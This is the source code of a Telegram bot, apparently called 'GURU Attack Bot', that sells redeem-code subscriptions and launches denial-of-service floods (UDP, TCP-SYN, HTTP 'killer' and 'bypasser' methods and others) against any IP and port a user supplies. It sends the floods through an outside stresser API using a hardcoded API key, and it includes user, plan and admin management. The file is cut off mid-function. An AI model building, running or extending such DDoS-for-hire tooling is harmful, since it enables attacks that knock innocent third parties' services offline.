import os
import logging
import asyncio
import aiohttp
import time
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv
from quart import Quart, jsonify
import signal
import sys

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))

# CONCURRENT SETTINGS
DEFAULT_CONCURRENT = 2
MIN_CONCURRENT = 1
MAX_CONCURRENT = 8
MIN_DURATION = 30
MAX_DURATION = 300

# ATTACK METHODS
ATTACK_METHODS = [
    "UDP-FLOOD", "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

METHOD_MAP = {
    "UDP-FLOOD": "UDP-FLOOD", "UDP-VSE": "UDP-VSE", "UDP-DNS": "UDP-DNS",
    "TCP-SYN": "TCP-SYN", "TCP-ACK": "TCP-ACK", "TCP-STOMP": "TCP-STOMP",
    "TCP-HANDSHAKE": "TCP-HANDSHAKE", "ICMP-FLOOD": "ICMP-FLOOD",
    "GRE-FLOOD": "GRE-FLOOD", "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX", "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER", "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== QUART APP =====
app = Quart(__name__)

@app.route('/')
async def index():
    return "🤖 GURU Attack Bot - UDP-FLOOD Default"

@app.route('/health')
async def health():
    if 'attack_manager' in globals():
        stats = attack_manager.get_stats()
        return jsonify({
            "status": "healthy",
            "timestamp": datetime.now().isoformat(),
            "active_attack": stats['is_running'],
            "concurrent": DEFAULT_CONCURRENT,
            "total_attacks": stats['total_attacks']
        })
    return jsonify({"status": "starting", "timestamp": datetime.now().isoformat()})

@app.route('/concurrent')
async def concurrent_status():
    if 'attack_manager' in globals():
        stats = attack_manager.get_stats()
        return jsonify({
            "active_attack": stats['is_running'],
            "concurrent_value": DEFAULT_CONCURRENT,
            "current_target": stats['current_target'],
            "remaining_time": stats['remaining_time']
        })
    return jsonify({"error": "Attack manager not initialized"})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = True
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.broadcasts = []
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000
                )
                self.client.admin.command('ping')
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                self.broadcasts = self.db.broadcasts
                self.settings = self.db.settings
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                self.admins.create_index("user_id", unique=True)
                
                if not self.settings.find_one({"_id": "bot_settings"}):
                    self.settings.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                self.memory_mode = False
                logger.info("✅ MongoDB connected successfully!")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if self.memory_mode:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id,
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0
                    }
                    return True
                return False
            else:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return True
        except:
            return False
    
    def get_user(self, user_id):
        try:
            if self.memory_mode:
                return self.users.get(user_id)
            else:
                return self.users.find_one({"user_id": user_id})
        except:
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            if expiry and isinstance(expiry, str):
                try:
                    expiry = datetime.fromisoformat(expiry)
                except:
                    expiry = None
            return plan, expiry
        except:
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry
                    return True
                return False
            else:
                expiry_str = expiry.isoformat() if expiry else None
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"plan": plan, "plan_expiry": expiry_str}}
                )
                return True
        except:
            return False
    
    def is_admin(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins
            else:
                return self.admins.find_one({"user_id": user_id}) is not None
        except:
            return False
    
    def is_owner_or_pseudo(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins and self.admins[user_id].get("level") in ["owner", "pseudo_owner"]
            else:
                admin = self.admins.find_one({"user_id": user_id})
                return admin and admin.get("level") in ["owner", "pseudo_owner"]
        except:
            return False
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if self.is_admin(user_id):
                return False
            if self.memory_mode:
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                return True
            else:
                self.admins.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
        except:
            return False
    
    def remove_admin(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
            else:
                result = self.admins.delete_one({"user_id": user_id})
                return result.deleted_count > 0
        except:
            return False
    
    def get_admins(self):
        try:
            if self.memory_mode:
                return [{"user_id": uid, "level": data.get("level", "admin")} 
                       for uid, data in self.admins.items()]
            else:
                return list(self.admins.find({}))
        except:
            return []
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = True
                    self.users[user_id]["ban_reason"] = reason
                return True
            else:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by}}
                )
                return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = False
                    self.users[user_id]["ban_reason"] = None
                return True
            else:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None}}
                )
                return True
        except:
            return False
    
    def create_code(self, code, days, created_by):
        try:
            if self.memory_mode:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
            else:
                if self.codes.find_one({"code": code}):
                    return False
                self.codes.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False
                })
                return True
        except:
            return False
    
    def use_code(self, code, user_id):
        try:
            if self.memory_mode:
                if code not in self.codes or self.codes[code].get("is_used", False):
                    return None
                code_data = self.codes[code]
                code_data["is_used"] = True
                code_data["used_by"] = user_id
                code_data["used_at"] = datetime.now()
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if user_id not in self.users:
                    self.add_user(user_id)
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = expiry
                self.users[user_id]["has_used_code"] = True
                return code_data
            else:
                code_data = self.codes.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                self.add_user(user_id)
                self.update_user_plan(user_id, "premium", expiry)
                return code_data
        except:
            return None
    
    def get_codes(self, only_unused=False):
        try:
            if self.memory_mode:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c.get("is_used", False)]
                return codes
            else:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes.find(query))
        except:
            return []
    
    def delete_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            else:
                result = self.codes.delete_one({"code": code})
                return result.deleted_count > 0
        except:
            return False
    
    def get_all_users(self):
        try:
            if self.memory_mode:
                return list(self.users.values())
            else:
                return list(self.users.find({}))
        except:
            return []
    
    def get_total_attacks(self):
        try:
            if self.memory_mode:
                return len(self.logs)
            else:
                return self.logs.count_documents({})
        except:
            return 0
    
    def get_user_stats(self, user_id):
        try:
            if self.memory_mode:
                return len([l for l in self.logs if l.get("user_id") == user_id])
            else:
                return self.logs.count_documents({"user_id": user_id})
        except:
            return 0
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            if self.memory_mode:
                self.logs.append(log)
            else:
                self.logs.insert_one(log)
            return True
        except:
            return False
    
    def get_pause_info(self):
        try:
            if self.memory_mode:
                return {"paused": self.settings.get("pause_all", False)}
            else:
                settings = self.settings.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at")
                    }
                return {"paused": False}
        except:
            return {"paused": False}
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if self.memory_mode:
                self.settings["pause_all"] = paused
            else:
                self.settings.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            return True
        except:
            return False

db = Database(MONGO_URI)

# ===== INITIALIZE OWNERS =====
def init_owners():
    try:
        if not db.get_user(OWNER_ID):
            db.add_user(OWNER_ID, "owner", "Owner")
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
        
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != OWNER_ID:
            if not db.get_user(PSEUDO_OWNER_ID):
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owners: {e}")

init_owners()

# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method, concurrent=2):
    """Send attack to API"""
    api_key = API_KEY
    api_url = API_URL
    
    if not api_key:
        return {"success": False, "error": "API Key missing"}
    
    api_method = METHOD_MAP.get(method.upper(), "UDP-FLOOD")
    
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method,
        "concs": str(concurrent)
    }
    
    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
        params["req_method"] = "GET"
        params["geoloc"] = "MIX"
        params["version"] = "1"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    
    logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
    
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:200]}
                
                logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                
                if response.status == 200:
                    return {
                        "success": True,
                        "elapsed": elapsed,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
                else:
                    return {
                        "success": False,
                        "error": f"HTTP {response.status}",
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": concurrent}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:50], "concurrent": concurrent}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.is_running = False
        self.current_target = None
        self.current_user = None
        self.attack_start_time = None
        self.attack_duration = 0
        self.current_concurrent = DEFAULT_CONCURRENT
        self.attack_lock = asyncio.Lock()
        self.attack_task = None
        self.total_attacks = 0
        logger.info(f"🔥 Attack Manager initialized with concurrent: {DEFAULT_CONCURRENT}")
    
    async def can_start_attack(self, user_id):
        async with self.attack_lock:
            if self.is_running:
                if self.attack_start_time:
                    elapsed = (datetime.now() - self.attack_start_time).total_seconds()
                    remaining = max(0, self.attack_duration - elapsed)
                    return False, f"❌ ATTACK IN PROGRESS!\n\n🎯 Target: {self.current_target}\n⏱️ Remaining: {int(remaining)}s"
            
            if db.is_banned(user_id):
                return False, "❌ You are banned!"
            
            plan, expiry = db.get_user_plan(user_id)
            is_owner = db.is_owner_or_pseudo(user_id)
            is_admin = db.is_admin(user_id)
            
            if not is_owner and not is_admin and plan != "premium":
                return False, "❌ PREMIUM REQUIRED\n\nUse /redeem CODE to activate."
            
            if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
                return False, "❌ PLAN EXPIRED"
            
            return True, "OK"
    
    async def start_attack(self, user_id, target, port, duration, method, context, concurrent=DEFAULT_CONCURRENT):
        async with self.attack_lock:
            if self.is_running:
                return None, "Attack already in progress!"
            
            self.is_running = True
            self.current_target = f"{target}:{port}"
            self.current_user = user_id
            self.attack_start_time = datetime.now()
            self.attack_duration = duration
            self.current_concurrent = concurrent
            self.total_attacks += 1
            
            logger.info(f"🔥 Attack starting - User: {user_id} - Target: {target}:{port}")
            
            self.attack_task = asyncio.create_task(
                self.execute_attack(target, port, duration, user_id, context, method, concurrent)
            )
            
            asyncio.create_task(self.cleanup_attack(duration))
            
            return True, f"Attack started with {concurrent} concurrent connections"
    
    async def execute_attack(self, target, port, duration, user_id, context, method, concurrent):
        try:
            result = await send_api_attack(target, port, duration, method, concurrent)
            
            db.log_attack(
                user_id, target, port, duration, method,
                "success" if result.get('success') else "failed",
                str(result.get('response', {}))[:200],
                concurrent
            )
            
            if result.get('success'):
                await context.bot.send_message(
                    user_id,
                    f"✅ *Attack Completed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏱️ Duration: `{duration}s`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"⚡ Status: SUCCESS",
                    parse_mode='Markdown'
                )
            else:
                await context.bot.send_message(
                    user_id,
                    f"❌ *Attack Failed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"❌ Error: `{result.get('error', 'Unknown error')}`",
                    parse_mode='Markdown'
                )
            
            # Send alert to admins
            admins = db.get_admins()
            for admin in admins:
                try:
                    await context.bot.send_message(
                        admin['user_id'],
                        f"⚡ *ATTACK ALERT*\n\n"
                        f"User: {user_id}\n"
                        f"Target: `{target}:{port}`\n"
                        f"Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}",
                        parse_mode='Markdown'
                    )
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"❌ Attack error: {e}")
    
    async def cleanup_attack(self, duration):
        await asyncio.sleep(duration + 2)
        async with self.attack_lock:
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = DEFAULT_CONCURRENT
            self.attack_task = None
            logger.info("✅ Attack cleaned up")
    
    async def stop_attack(self, user_id):
        async with self.attack_lock:
            if not self.is_running:
                return False, "No attack is running"
            
            if self.attack_task and not self.attack_task.done():
                self.attack_task.cancel()
            
            target = self.current_target
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = DEFAULT_CONCURRENT
            self.attack_task = None
            
            return True, f"Attack on {target} stopped"
    
    def get_stats(self):
        remaining = 0
        if self.is_running and self.attack_start_time:
            elapsed = (datetime.now() - self.attack_start_time).total_seconds()
            remaining = max(0, self.attack_duration - elapsed)
        
        return {
            'is_running': self.is_running,
            'current_target': self.current_target,
            'current_user': self.current_user,
            'remaining_time': int(remaining),
            'total_attacks': self.total_attacks
        }

attack_manager = AttackManager()

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    db.add_user(user_id, user.username, user.first_name)
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    stats = attack_manager.get_stats()
    
    plan_display = "💎 PREMIUM" if plan == "premium" else "🆓 FREE"
    if plan == "premium" and expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display = f"💎 PREMIUM ({days_left}d left)"
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await update.message.reply_text(
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {user.first_name}! 👋\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"📡 Default: UDP-FLOOD\n\n"
        f"💡 Use /attack IP PORT TIME to start\n"
        f"Use /redeem CODE to upgrade",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME [METHOD] [CONCURRENT]`\n\n"
            f"Example: `/attack 8.8.8.8 43 30`\n"
            f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`\n"
            f"With concurrent: `/attack 8.8.8.8 43 30 UDP-FLOOD 4`\n\n"
            f"⚡ Default: UDP-FLOOD, {DEFAULT_CONCURRENT}x concurrent\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION}s\n"
            f"📡 Methods: {', '.join(ATTACK_METHODS[:5])}...",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = "UDP-FLOOD"
        concurrent = DEFAULT_CONCURRENT
        
        if len(args) > 3:
            if args[3].upper() in ATTACK_METHODS:
                method = args[3].upper()
                if len(args) > 4:
                    concurrent = int(args[4])
            else:
                try:
                    concurrent = int(args[3])
                    if len(args) > 4:
                        method = args[4].upper()
                except:
                    method = args[3].upper()
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION}s!")
            return
        
        if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be {MIN_CONCURRENT}-{MAX_CONCURRENT}!")
            return
        
        success, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context, concurrent
        )
        
        if not success:
            await update.message.reply_text(f"❌ {msg}")
            return
        
        await update.message.reply_text(
            f"✅ *ATTACK STARTED!*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"📡 Method: `{method}`\n"
            f"🔄 Concurrent: **{concurrent}**\n"
            f"⚡ Status: RUNNING",
            parse_mode='Markdown'
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid value: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can stop attacks!")
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    await update.message.reply_text(f"{'✅' if success else '❌'} {msg}")

async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can change concurrent settings!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"⚡ Current concurrent: **{DEFAULT_CONCURRENT}**\n"
            f"Usage: `/setconcurrent 2`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_concurrent = int(args[0])
        if new_concurrent < MIN_CONCURRENT or new_concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Must be between {MIN_CONCURRENT}-{MAX_CONCURRENT}!")
            return
        
        global DEFAULT_CONCURRENT
        DEFAULT_CONCURRENT = new_concurrent
        await update.message.reply_text(f"✅ Concurrent set to **{DEFAULT_CONCURRENT}**", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test API!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: `/testapi HOST PORT TIME [CONCURRENT] [METHOD]`")
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        concurrent = DEFAULT_CONCURRENT
        method = "UDP-FLOOD"
        
        if len(args) > 3:
            try:
                concurrent = int(args[3])
                if len(args) > 4:
                    method = args[4].upper()
            except:
                method = args[3].upper()
        
        status_msg = await update.message.reply_text("⏳ Testing API...")
        result = await send_api_attack(target, port, duration, method, concurrent)
        
        if result.get('success'):
            await status_msg.edit_text(
                f"✅ *API Test Success*\n\n"
                f"Target: `{target}:{port}`\n"
                f"Concurrent: {concurrent}\n"
                f"Response Time: `{result.get('elapsed', 0):.2f}s`\n"
                f"Status: {result.get('status')}",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *API Test Failed*\n\n"
                f"Error: `{result.get('error', 'Unknown error')}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"⏱️ Remaining: {stats['remaining_time']}s\n"
        f"👥 Users: {len(users)}\n"
        f"💥 Attacks: {stats['total_attacks']}\n"
        f"📡 Default: UDP-FLOOD",
        parse_mode='Markdown'
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not args:
        await update.message.reply_text("🎫 Usage: `/redeem CODE`")
        return
    
    code = args[0].upper()
    result = db.use_code(code, user_id)
    
    if result:
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {duration_text}\n"
            f"Plan: 💎 PREMIUM",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Invalid or already used code!")

# ===== CALLBACK HANDLERS =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    keyboard = []
    for method in ATTACK_METHODS[:10]:
        keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    await query.edit_message_text(
        f"💥 *SELECT METHOD*\n\n"
        f"Default: UDP-FLOOD\n"
        f"Send: `IP PORT TIME` after selecting",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"📡 *Method: {method}*\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 43 30`\n\n"
        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"🔄 Concurrent: {DEFAULT_CONCURRENT}\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    if is_owner:
        text = "👑 *OWNER*\n\n💎 Premium (Lifetime)"
    elif plan == "premium":
        if expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            text = f"💎 *PREMIUM*\n\nRemaining: {days_left} days\nExpires: {expiry.strftime('%Y-%m-%d')}"
        else:
            text = "💎 *PREMIUM*\n\nStatus: LIFETIME"
    else:
        text = "🆓 *FREE*\n\nUse `/redeem CODE` to upgrade"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    total_attacks = db.get_total_attacks()
    
    await query.edit_message_text(
        f"📊 *STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"🔄 Concurrent: {DEFAULT_CONCURRENT}\n"
        f"⚡ Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
